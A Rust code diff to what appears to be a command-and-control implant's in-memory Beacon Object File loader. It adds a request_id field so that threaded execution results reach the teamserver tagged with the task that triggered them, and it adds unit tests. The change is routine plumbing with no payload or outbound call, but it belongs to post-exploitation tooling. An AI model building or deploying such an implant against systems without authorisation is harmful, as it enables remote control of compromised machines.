@@ -55,6 +55,10 @@ pub struct BofCallback {
     pub callback_type: u32,
     /// Payload bytes for this callback (type-specific encoding).
     pub payload: Vec<u8>,
+    /// The originating request ID from the teamserver task that triggered this
+    /// BOF execution.  Must be preserved so threaded callbacks can be correlated
+    /// with the correct task on the teamserver side.
+    pub request_id: u32,
 }
 
 // ─── Windows implementation ─────────────────────────────────────────────────
@@ -148,7 +152,11 @@ pub fn coffee_execute(
 
     if object_data.len() < COFF_HEADER_SIZE {
         return BofResult {
-            callbacks: vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new() }],
+            callbacks: vec![BofCallback {
+                callback_type: BOF_COULD_NOT_RUN,
+                payload: Vec::new(),
+                request_id: 0,
+            }],
         };
     }
 
@@ -165,7 +173,11 @@ pub fn coffee_execute(
     if header.machine != IMAGE_FILE_MACHINE_AMD64 {
         warn!(machine = header.machine, "BOF: unsupported COFF machine type");
         return BofResult {
-            callbacks: vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new() }],
+            callbacks: vec![BofCallback {
+                callback_type: BOF_COULD_NOT_RUN,
+                payload: Vec::new(),
+                request_id: 0,
+            }],
         };
     }
 
@@ -184,6 +196,7 @@ pub fn coffee_execute(
                 callbacks: vec![BofCallback {
                     callback_type: BOF_COULD_NOT_RUN,
                     payload: Vec::new(),
+                    request_id: 0,
                 }],
             };
         }
@@ -268,6 +281,7 @@ pub fn coffee_execute(
                 callbacks: vec![BofCallback {
                     callback_type: BOF_COULD_NOT_RUN,
                     payload: Vec::new(),
+                    request_id: 0,
                 }],
             };
         }
@@ -430,9 +444,17 @@ pub fn coffee_execute(
             let sym_bytes = sym.as_bytes();
             payload.extend_from_slice(&(sym_bytes.len() as u32).to_le_bytes());
             payload.extend_from_slice(sym_bytes);
-            callbacks.push(BofCallback { callback_type: BOF_SYMBOL_NOT_FOUND, payload });
+            callbacks.push(BofCallback {
+                callback_type: BOF_SYMBOL_NOT_FOUND,
+                payload,
+                request_id: 0,
+            });
         }
-        callbacks.push(BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new() });
+        callbacks.push(BofCallback {
+            callback_type: BOF_COULD_NOT_RUN,
+            payload: Vec::new(),
+            request_id: 0,
+        });
 
         // Cleanup
         for (i, &base) in section_bases.iter().enumerate() {
@@ -575,9 +597,17 @@ pub fn coffee_execute(
                     let mut payload = Vec::new();
                     payload.extend_from_slice(&(bof_output.len() as u32).to_le_bytes());
                     payload.extend_from_slice(&bof_output);
-                    cbs.push(BofCallback { callback_type: BOF_CALLBACK_OUTPUT, payload });
+                    cbs.push(BofCallback {
+                        callback_type: BOF_CALLBACK_OUTPUT,
+                        payload,
+                        request_id: 0,
+                    });
                 }
-                cbs.push(BofCallback { callback_type: BOF_RAN_OK, payload: Vec::new() });
+                cbs.push(BofCallback {
+                    callback_type: BOF_RAN_OK,
+                    payload: Vec::new(),
+                    request_id: 0,
+                });
                 cbs
             }
             Err(_) => {
@@ -589,12 +619,13 @@ pub fn coffee_execute(
                         p.extend_from_slice(&(ep as u64).to_le_bytes()); // address
                         p
                     },
+                    request_id: 0,
                 }]
             }
         }
     } else {
         warn!(function_name, "BOF: entry point not found");
-        vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new() }]
+        vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new(), request_id: 0 }]
     };
 
     // ── Cleanup ─────────────────────────────────────────────────────────
@@ -628,7 +659,11 @@ pub fn coffee_execute(
 ) -> BofResult {
     warn!("BOF execution is only supported on Windows");
     BofResult {
-        callbacks: vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new() }],
+        callbacks: vec![BofCallback {
+            callback_type: BOF_COULD_NOT_RUN,
+            payload: Vec::new(),
+            request_id: 0,
+        }],
     }
 }
 
@@ -641,6 +676,7 @@ struct BofThreadArgs {
     object_data: Vec<u8>,
     arg_data: Vec<u8>,
     output_queue: BofOutputQueue,
+    request_id: u32,
 }
 
 /// Thread entry point for threaded BOF execution.
@@ -656,10 +692,21 @@ unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 
     let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
     let result = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
 
+    // Stamp the originating request ID on every callback so the teamserver can
+    // correlate threaded BOF results with the correct task.
+    let callbacks: Vec<BofCallback> = result
+        .callbacks
+        .into_iter()
+        .map(|mut cb| {
+            cb.request_id = args.request_id;
+            cb
+        })
+        .collect();
+
     // Forward BOF callbacks to the shared output queue so the main agent loop
     // can drain and send them to the teamserver on the next iteration.
     if let Ok(mut queue) = args.output_queue.lock() {
-        queue.extend(result.callbacks);
+        queue.extend(callbacks);
     }
 
     0
@@ -684,8 +731,10 @@ pub fn coffee_execute_threaded(
     object_data: Vec<u8>,
     arg_data: Vec<u8>,
     output_queue: BofOutputQueue,
+    request_id: u32,
 ) -> Option<isize> {
-    let args = Box::new(BofThreadArgs { function_name, object_data, arg_data, output_queue });
+    let args =
+        Box::new(BofThreadArgs { function_name, object_data, arg_data, output_queue, request_id });
     let param = Box::into_raw(args).cast::<std::ffi::c_void>();
 
     // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
@@ -720,6 +769,7 @@ pub fn coffee_execute_threaded(
     _object_data: Vec<u8>,
     _arg_data: Vec<u8>,
     _output_queue: BofOutputQueue,
+    _request_id: u32,
 ) -> Option<isize> {
     warn!("Threaded BOF execution is only supported on Windows");
     None
@@ -772,6 +822,7 @@ mod tests {
             vec![0u8; 20],
             vec![],
             new_bof_output_queue(),
+            42,
         );
         assert!(result.is_none());
     }
@@ -790,8 +841,16 @@ mod tests {
         // Simulate a background thread pushing callbacks
         {
             let mut guard = queue.lock().expect("lock");
-            guard.push(BofCallback { callback_type: BOF_RAN_OK, payload: vec![1, 2, 3] });
-            guard.push(BofCallback { callback_type: BOF_CALLBACK_OUTPUT, payload: vec![4, 5] });
+            guard.push(BofCallback {
+                callback_type: BOF_RAN_OK,
+                payload: vec![1, 2, 3],
+                request_id: 7,
+            });
+            guard.push(BofCallback {
+                callback_type: BOF_CALLBACK_OUTPUT,
+                payload: vec![4, 5],
+                request_id: 7,
+            });
         }
 
         // Drain (take) the callbacks
@@ -814,6 +873,7 @@ mod tests {
             guard.push(BofCallback {
                 callback_type: BOF_CALLBACK_OUTPUT,
                 payload: b"hello from thread".to_vec(),
+                request_id: 99,
             });
         });
 
@@ -822,5 +882,37 @@ mod tests {
         let guard = queue.lock().expect("lock");
         assert_eq!(guard.len(), 1);
         assert_eq!(guard[0].payload, b"hello from thread");
+        assert_eq!(guard[0].request_id, 99);
+    }
+
+    #[test]
+    fn bof_callback_preserves_request_id() {
+        let cb = BofCallback { callback_type: BOF_RAN_OK, payload: vec![], request_id: 0xDEAD };
+        assert_eq!(cb.request_id, 0xDEAD);
+    }
+
+    #[test]
+    fn bof_output_queue_preserves_request_id_across_drain() {
+        let queue = new_bof_output_queue();
+        let task_id: u32 = 42;
+
+        {
+            let mut guard = queue.lock().expect("lock");
+            guard.push(BofCallback {
+                callback_type: BOF_CALLBACK_OUTPUT,
+                payload: b"output data".to_vec(),
+                request_id: task_id,
+            });
+            guard.push(BofCallback {
+                callback_type: BOF_RAN_OK,
+                payload: Vec::new(),
+                request_id: task_id,
+            });
+        }
+
+        let drained = std::mem::take(&mut *queue.lock().expect("lock"));
+        assert_eq!(drained.len(), 2);
+        assert_eq!(drained[0].request_id, task_id);
+        assert_eq!(drained[1].request_id, task_id);
     }
 }
